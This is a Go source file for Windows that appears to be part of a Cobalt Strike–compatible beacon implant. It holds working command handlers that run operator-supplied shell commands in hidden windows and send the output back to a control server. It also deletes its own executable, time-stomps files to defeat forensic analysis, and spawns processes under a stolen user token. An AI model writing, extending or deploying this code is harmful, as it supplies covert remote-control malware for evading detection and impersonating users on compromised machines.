//go:build windows

package command

import (
	"errors"
	"golang.org/x/sys/windows"
	"main/config"
	"main/packet"
	"main/util"
	"os"
	"strings"
	"unsafe"
)

// put some other windows function implement here temporary
func DeleteSelf() {
	if config.DeleteSelf {
		selfName, err := os.Executable()
		if err != nil {
			return
		}
		var sI windows.StartupInfo
		var pI windows.ProcessInformation
		program := windows.StringToUTF16Ptr("cmd.exe /c del " + string(selfName))
		err = createProcessNative(nil, program, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)
		if err != nil {
			return
		}
		_ = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
	}
}

// maybe need to be checked
func listDrivesInner(b []byte) error {
	bitMask, err := windows.GetLogicalDrives()
	if err != nil {
		return err
	}
	var result []byte
	// extremely strange...
	// cs server consider 47 as A, 48 as B, and so on
	i := 47
	for bitMask > 0 {
		if bitMask%2 == 1 {
			result = append(result, byte(i))
		}
		bitMask >>= 1
		i++
	}
	packet.PushResult(packet.CALLBACK_PENDING, util.BytesCombine(b[0:4], result))
	return nil
}

func TimeStompInner(b []byte) error {
	to, from, err := parseTimeStomp(b)
	if err != nil {
		return err
	}
	fromPtr := windows.StringToUTF16Ptr(string(from))
	toPtr := windows.StringToUTF16Ptr(string(to))
	fromHandle, err := windows.CreateFile(fromPtr, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(fromHandle)
	toHandle, err := windows.CreateFile(toPtr, windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(toHandle)
	var creationTime = &windows.Filetime{}
	var lastAccessTime = &windows.Filetime{}
	var lastWriteTime = &windows.Filetime{}
	_, _, err = getFileTime.Call(uintptr(fromHandle), uintptr(unsafe.Pointer(creationTime)), uintptr(unsafe.Pointer(lastAccessTime)), uintptr(unsafe.Pointer(lastWriteTime)))
	if err != nil && err != windows.NTE_OP_OK {
		return err
	}
	err = windows.SetFileTime(toHandle, creationTime, lastAccessTime, lastWriteTime)
	return err
}

/*
	Run this function should handler both `shell` and `run` cmd, need to return the result

shell would send a payload like `%COMSPEC% /C cmd`,%COMSPEC% as path, `/C cmd` as args,
but run would just send `cmd` as args, and with a path length 0
%COMSPEC% point to cmd.exe usually, and we always read %COMSPEC% as app, follow as args
we have extracted path and args before call Run, so only deploy how to run a process is ok
*/
func Run(b []byte) error {
	// third params is Wow64DisableWow64FsRedirection, used for 32bit wow64 program to access native system32 folder,
	// but I have changed the system32 dir manually, so it is ignored
	path, args, _, err := parseCommandShell(b)
	if err != nil {
		return err
	}
	// result was send to server in runNative
	_, err = runNative(string(path), string(args))
	return err

	//path = strings.Trim(path, " ")
	//args = strings.Trim(args, " ")
	//// handler with `shell` cmd, env var is not fully supported
	//if path == "%COMSPEC%" {
	//	envKey := strings.ReplaceAll(path, "%", "")
	//	resolvedPath := os.Getenv(envKey)
	//	// trim /C
	//	args = args[3:]
	//	cmd := exec.Command(resolvedPath, "/C", args)
	//	return cmd.CombinedOutput()
	//} else { // run cmd
	//	if len(path) != 0 {
	//		return nil, errors.New("get a path from run cmd")
	//	}
	//	// SplitN means split string into n parts, so it should be 2
	//	parts := strings.SplitN(args, " ", 2)
	//	var cmd *exec.Cmd
	//	// golang doesn't support ternary operator
	//	if len(parts) == 2 {
	//		// it seems ok to pass whole args as one string in windows?
	//		cmd = exec.Command(parts[0], parts[1])
	//	} else {
	//		cmd = exec.Command(parts[0])
	//	}
	//	return cmd.CombinedOutput()
	//}
}

func Exec(b []byte) error {
	err := execNative(b)
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("exec success"))
	return nil
	//parts := strings.SplitN(string(b), " ", 2)
	//var cmd *exec.Cmd
	//if len(parts) == 2 {
	//	cmd = exec.Command(parts[0], parts[1])
	//} else {
	//	cmd = exec.Command(parts[0])
	//}
	//return cmd.Start()
}

// call windowsAPI CreateProcess, when it's cmd `shell`, %COMSPEC% will be the path
// and cmd run doesn't give path, as set path to null and args as commandline
func runNative(path string, args string) ([]byte, error) {
	args = strings.Trim(args, " ")
	var (
		sI windows.StartupInfo
		pI windows.ProcessInformation

		hWPipe windows.Handle
		hRPipe windows.Handle
	)

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	// create anonymous pipe
	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return nil, errors.New(util.Sprintf("CreatePipe error: %s", err))
	}
	// because we need to use go func to send result back asynchronously, so we can't use defer to close handle,
	// close it manually

	sI.Flags = windows.STARTF_USESTDHANDLES
	sI.StdErr = hWPipe
	sI.StdOutput = hWPipe

	var pathPtr *uint16
	// path should only be null or %COMSPEC%
	if path == "" {
		pathPtr = nil
	} else if path == "%COMSPEC%" {
		envKey := strings.ReplaceAll(path, "%", "")
		resolvedPath := os.Getenv(envKey)
		pathPtr = windows.StringToUTF16Ptr(resolvedPath)
	} else {
		_ = windows.CloseHandle(hWPipe)
		_ = windows.CloseHandle(hRPipe)
		return nil, errors.New("path is not null or %COMSPEC%")
	}
	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)

	if err != nil {
		_ = windows.CloseHandle(hWPipe)
		_ = windows.CloseHandle(hRPipe)
		return nil, err
	}

	go func() {
		defer windows.CloseHandle(pI.Process)
		defer windows.CloseHandle(pI.Thread)
		defer windows.CloseHandle(hWPipe)
		defer windows.CloseHandle(hRPipe)
		// some task like tasklist wouldn't exit, only wait for 10 seconds for output
		// and if time out I may need to kill it manually
		event, err := windows.WaitForSingleObject(pI.Process, 10*1000)
		if event == uint32(windows.WAIT_TIMEOUT) {
			// this only kill target process, if cmd.exe call tasklist.exe,
			// only cmd.exe will be killed, and tasklist will still exist, which may make beacon cannot exit fully?
			// but it only occurs in goland, maybe just goland continue tracking subprocesses.
			defer windows.TerminateProcess(pI.Process, 0)
		}
		if err != nil {
			packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
		}
		finish := false
		for !finish {
			if event == windows.WAIT_OBJECT_0 {
				finish = true
			}
			// use PeekNamedPipe to determine whether output exist
			// if lpTotalBytesAvail is 0, ReadFile will block the whole process
			var lpTotalBytesAvail uint32
			_, _, err = peekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
			if err != nil && err != windows.SEVERITY_SUCCESS {
				packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
			}
			if lpTotalBytesAvail != 0 {
				if lpTotalBytesAvail > 0x80000 {
					packet.PushResult(packet.CALLBACK_OUTPUT, []byte("output bigger than 0x80000"))
				} else {
					buf := make([]byte, lpTotalBytesAvail)
					var bytesRead uint32
					// Overlapped will be ignored when reading anonymous pipe
					_ = windows.ReadFile(hRPipe, buf, &bytesRead, nil)
					packet.PushResult(packet.CALLBACK_OUTPUT, buf[:bytesRead])
				}
			}
			// use WaitForSingleObject to check if process had exit
			event, err = windows.WaitForSingleObject(pI.Process, 0)
			if err != nil {
				packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
				break
			}
		}
		packet.PushResult(packet.CALLBACK_OUTPUT, []byte("--------------output end----------------"))
	}()
	return nil, nil
}

func execNative(b []byte) error {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation

	program, _ := windows.UTF16PtrFromString(string(b))
	// when appName set to null, will use the first part of commandLine as the app, and rest as args
	defer windows.CloseHandle(pI.Process)
	defer windows.CloseHandle(pI.Thread)
	return createProcessNative(nil, program, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)
}

// if there is a token, use it to create new process
func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation, ignoreToken bool) error {
	// force create no window
	creationFlags = creationFlags | windows.CREATE_NO_WINDOW
	if !ignoreToken && isTokenValid {
		_, _, err := createProcessWithTokenW.Call(uintptr(stolenToken), LOGON_WITH_PROFILE, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)))
		if err != nil && err != windows.SEVERITY_SUCCESS {
			if err != windows.ERROR_PRIVILEGE_NOT_HELD {
				return errors.New(util.Sprintf("CreateProcessWithTokenW error: %s", err))
			}
			err = windows.CreateProcessAsUser(stolenToken, appName, commandLine, procSecurity, threadSecurity, inheritHandles, creationFlags, env, currentDir, startupInfo, outProcInfo)
			if err != nil {
				return err
			}
		}
	} else {
		err := windows.CreateProcess(appName, commandLine, procSecurity, threadSecurity, inheritHandles, creationFlags, env, currentDir, startupInfo, outProcInfo)
		if err != nil {
			return errors.New(util.Sprintf("CreateProcess error: %s", err))
		}
	}
	return nil
}
